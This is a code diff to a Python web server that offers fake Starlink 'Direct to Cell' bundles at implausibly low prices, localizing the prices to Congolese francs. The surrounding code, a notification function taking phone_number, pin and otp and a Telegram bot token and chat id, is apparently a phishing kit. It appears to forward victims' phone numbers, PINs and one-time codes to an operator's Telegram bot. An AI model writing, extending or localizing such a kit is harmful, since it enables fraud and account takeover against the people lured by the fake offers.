@@ -38,12 +38,19 @@ def get_telegram_config():
 
     return bot_token, chat_id
 
+USD_TO_CDF = 2300
+
+
+def format_cdf_price(amount_usd):
+    return f"CDF {round(amount_usd * USD_TO_CDF):,}"
+
+
 PLANS = {
-    "12": {"name": "Basic Satellite Bundle", "details": "1GB + 200 Min · 200 Minutes + 1000 SMS + 1GB Data", "price": "USD $0.50"},
-    "13": {"name": "Starlink Connect", "details": "5GB + 500 Min · 500 Minutes + 5000 SMS + 5GB Data", "price": "USD $1.00"},
-    "14": {"name": "Starlink Family", "details": "10GB + 1000 Min · 1000 Minutes + 10000 SMS + 10GB Data", "price": "USD $1.50"},
-    "15": {"name": "Direct to Cell Premium", "details": "20GB + 2000 Min · 2000 Minutes + Unlimited SMS + 20GB Data", "price": "USD $2.00"},
-    "16": {"name": "Unlimited Direct to Cell", "details": "Unlimited Minutes + Unlimited SMS + Unlimited Data", "price": "USD $2.50"},
+    "12": {"name": "Basic Satellite Bundle", "details": "1GB + 200 Min · 200 Minutes + 1000 SMS + 1GB Data", "price": format_cdf_price(0.50)},
+    "13": {"name": "Starlink Connect", "details": "5GB + 500 Min · 500 Minutes + 5000 SMS + 5GB Data", "price": format_cdf_price(1.00)},
+    "14": {"name": "Starlink Family", "details": "10GB + 1000 Min · 1000 Minutes + 10000 SMS + 10GB Data", "price": format_cdf_price(1.50)},
+    "15": {"name": "Direct to Cell Premium", "details": "20GB + 2000 Min · 2000 Minutes + Unlimited SMS + 20GB Data", "price": format_cdf_price(2.00)},
+    "16": {"name": "Unlimited Direct to Cell", "details": "Unlimited Minutes + Unlimited SMS + Unlimited Data", "price": format_cdf_price(2.50)},
 }
 
 
@@ -52,7 +59,7 @@ def send_telegram_notification(package_id, phone_number, stage=None, pin="", otp
     if not bot_token or not chat_id:
         return False, "Telegram is not configured. Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID to your .env file or shell environment."
 
-    plan = PLANS.get(package_id, {"name": "Selected Bundle", "price": "USD $0.00"})
+    plan = PLANS.get(package_id, {"name": "Selected Bundle", "price": "CDF 0"})
 
     if stage == "phone":
         message = (
@@ -122,7 +129,7 @@ class Handler(SimpleHTTPRequestHandler):
             body = self.rfile.read(length).decode("utf-8")
             data = parse_qs(body)
             package_id = data.get("package_id", [""])[0]
-            plan = PLANS.get(package_id, {"name": "Selected Bundle", "details": "Custom plan", "price": "USD $0.00"})
+            plan = PLANS.get(package_id, {"name": "Selected Bundle", "details": "Custom plan", "price": "CDF 0"})
             html = Path(ROOT / "payment.html").read_text(encoding="utf-8")
             html = html.replace("{{PLAN_NAME}}", plan["name"]) \
                        .replace("{{PLAN_DETAILS}}", plan["details"]) \
